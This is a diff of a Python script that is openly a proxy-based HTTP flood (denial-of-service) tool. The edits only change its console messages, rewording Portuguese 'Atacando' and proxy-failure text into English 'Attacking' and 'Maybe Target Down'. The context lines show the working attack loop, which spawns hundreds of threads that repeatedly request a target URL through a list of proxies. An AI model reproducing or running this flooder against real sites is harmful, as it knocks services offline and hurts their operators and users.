@@ -16,7 +16,7 @@ def opth():
                 x = threading.Thread(target=atk)
                 x.start()
                 print("Threads " + str(a+1) + " Created ")
-        print("Hey! Brother, please make a cup of coffee, the attack thread is loading....")
+        print("The Attack Thread İs Loading.")
         time.sleep(100)
         input("Press Enter To Start The Attack")
         global oo
@@ -42,9 +42,9 @@ def main():
 
         list = str(input("Proxy Filename [proxy.txt]: " ))
         pprr = open(list).readlines()
-        print("Get an agent : "  + "%d" %len(pprr))
-        thr = int(input("[+] Threads (100-1000 default 500) : " ))
-        per = int(input("[+] Times (1-100 default 70) : " ))
+        print("Get An Agent : "  + "%d" %len(pprr))
+        thr = int(input("[+] Threads [100-1000 default 500] : " ))
+        per = int(input("[+] Power [1-100 default 70] : " ))
         opth()
 
 def atk():
@@ -59,17 +59,17 @@ def atk():
                 while oo:
                         try:
                                 s.get(url)
-                                print(Fore.CYAN + "Atacando --->  "  + str(url) + " Proxy~# " + str(proxy[0])+":"+str(proxy[1]))
+                                print(Fore.CYAN + "Attacking -->  "  + str(url) + " Proxy~# " + str(proxy[0])+":"+str(proxy[1]))
                                 try:
                                         for g in range(per):
                                                 s.get(url)
-                                                print(Fore.CYAN + "Atacando --->  "  + str(url)+Fore.CYAN + " Proxy~# " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
+                                                print(Fore.CYAN + "Attacking -->  "  + str(url)+Fore.CYAN + " Proxy~# " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
                                         s.close()
                                 except:
                                         s.close()
                         except:
                                 s.close()
-                                print(Fore.RED + "Conexão com a proxy falhou!")
+                                print(Fore.RED + "Maybe Target Down, No Connection!")
 
 
 if __name__ == "__main__":
